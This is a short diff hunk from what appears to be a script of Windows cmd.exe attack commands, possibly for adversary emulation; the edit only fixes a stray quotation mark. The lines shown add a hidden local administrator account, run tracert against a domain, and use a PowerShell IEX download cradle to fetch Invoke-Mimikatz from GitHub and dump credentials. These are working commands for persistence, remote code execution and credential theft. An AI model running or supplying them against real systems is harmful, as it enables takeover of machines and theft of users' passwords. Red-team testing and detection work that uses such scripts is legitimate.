@@ -16,4 +16,4 @@ cmd.exe /c "net localgroup Administrators rickflair /add"
 
 cmd.exe /c "tracert -d systemlowcheck.com"
 
-cmd.exe /c "powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds""
+cmd.exe /c "powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
